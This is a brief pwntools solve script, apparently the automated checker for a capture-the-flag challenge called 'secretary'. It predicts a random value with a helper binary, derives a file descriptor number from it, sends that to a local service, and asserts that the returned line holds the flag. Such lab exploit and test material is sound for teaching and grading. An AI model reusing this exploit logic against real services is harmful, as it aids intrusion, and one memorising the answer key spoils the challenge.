import os
import yaml
import logging
from pwn import *
from pathlib import Path

logger = logging.getLogger("secretary")
HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


def solve(sh):
    sub = int(os.popen("./get_rand").read().rstrip())
    fd = sub + 0x1100
    sh.sendline(str(fd).encode())
    sh.sendline(b"The FitnessGram Pacer Test is a multistage...")
    flag = sh.recvline().decode()
    assert FLAG in flag, flag


def test(domain, port):
    sh = remote(domain, port)
    solve(sh)


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    test("localhost", 32000)
    # sh = process("./src/chall")
    # solve(sh)
